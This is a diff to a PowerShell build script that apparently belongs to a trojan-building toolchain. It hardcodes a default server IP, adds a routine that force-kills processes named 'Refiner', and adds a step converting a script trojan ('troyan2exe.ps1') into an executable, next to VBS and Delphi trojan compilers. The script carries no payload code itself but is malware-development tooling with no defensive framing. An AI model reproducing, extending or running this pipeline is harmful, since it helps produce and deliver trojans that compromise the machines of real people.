@@ -1,15 +1,38 @@
 param (
-    [string]$serverName, [string]$action = "apply"
+    [string]$serverName, [string]$action = "apply", [string]$kill="kill"
 )
 
 if ($serverName -eq "") {
     $serverName = "185.247.141.76"
-    $action = "apply"
+    $action = "exe"
 } 
 
 if ([string]::IsNullOrEmpty($serverName))
 {
     throw "compile.ps1 -serverName argument is null"
+}
+
+function Kill-TaskByName {
+    param (
+        [string]$TaskName
+    )
+    $processes = Get-Process | Where-Object { $_.Name -like "*$TaskName*" }
+    if ($processes) {
+        foreach ($process in $processes) {
+            try {
+                Stop-Process -Id $process.Id -Force
+                Write-Host "Killed process: $($process.Name) (ID: $($process.Id))"
+            } catch {
+                Write-Host "Failed to kill process: $($process.Name) (ID: $($process.Id)) - $_"
+            }
+        }
+    } else {
+        Write-Host "No processes found matching '$TaskName'."
+    }
+}
+if ($kill -eq "kill")
+{
+    Kill-TaskByName -TaskName "Refiner"
 }
 
 #currents
@@ -26,8 +49,11 @@ if ([string]::IsNullOrEmpty($server.rootDir)) {
 #general script
 & (Join-Path -Path $server.troyanDir -ChildPath "./troyancompile.ps1") -serverName $serverName
 
+#general script to exe
+& (Join-Path -Path $server.troyanDir -ChildPath "./troyan2exe.ps1") -serverName $serverName
+
 #delphi
-# & (Join-Path -Path $server.troyanDelphiDir -ChildPath "./delphicompile.ps1") -serverName $serverName
+### & (Join-Path -Path $server.troyanDelphiDir -ChildPath "./delphicompile.ps1") -serverName $serverName
 
 #vbs
 & (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName
